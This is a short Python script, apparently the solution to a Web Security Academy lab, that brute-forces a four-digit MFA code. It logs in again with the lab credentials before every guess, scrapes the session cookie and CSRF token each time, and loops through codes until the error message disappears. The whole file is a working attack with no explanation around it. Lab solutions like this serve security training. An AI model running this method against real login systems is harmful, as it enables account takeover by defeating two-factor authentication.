import requests
import re



target1 = "https://acb01f321ed24762c0ff1c6100cb0035.web-security-academy.net/login"
target2 = "https://acb01f321ed24762c0ff1c6100cb0035.web-security-academy.net/login2"
csrf_search = re.compile('value="[a-zA-Z0-9]*"')



def login():
    response = requests.get(target1)
    session_id = response.headers['Set-Cookie'].split(';')[0].split('=')[1]
    print(f"GRABBING SESSION_COOKIE: {session_id}")
    session_cookie = {'session': session_id}
    match = re.findall(csrf_search, response.text)
    cut = match[0].split('"')
    csrf_token = cut[1]
    print(f"MINING CSRF TOKEN: {csrf_token}")
    user_login = {'csrf': csrf_token, 'username': 'carlos', 'password': 'montoya'}
    response = requests.post(target1, cookies=session_cookie, data=user_login)
    print(response.history[0].headers['Set-Cookie'].split('=')[1].split(';')[0])
    session_id = response.history[0].headers['Set-Cookie'].split('=')[1].split(';')[0]
    session_cookie = {'session': session_id}
    match = re.findall(csrf_search, response.text)
    cut = match[0].split('"')
    csrf_token = cut[1]
    return [csrf_token, session_cookie]




def bruteforce():
    found_token = None
    mfa_code = ""
    while found_token is None:
        for num in range(1400,10000):
            if num < 10:
                mfa_code = '000' + str(num)
            elif num < 100:
                mfa_code = '00' + str(num)
            elif num <= 999:
                mfa_code = '0' + str(num)
            else:
                mfa_code = str(num)
            print(f'TESTING CODE {mfa_code}')
            tokens = login()
            session_cookie = tokens[1]
            csrf_token = tokens[0]
            print(session_cookie, csrf_token)
            data = {'csrf': csrf_token, 'mfa-code': mfa_code}
            response = requests.post(target2, cookies=session_cookie, data=data)
            if 'Incorrect security code' not in response.text or response.status_code == 302:
                print(f"FOUND CODE: {mfa_code}")
                found_token = mfa_code
                break



bruteforce()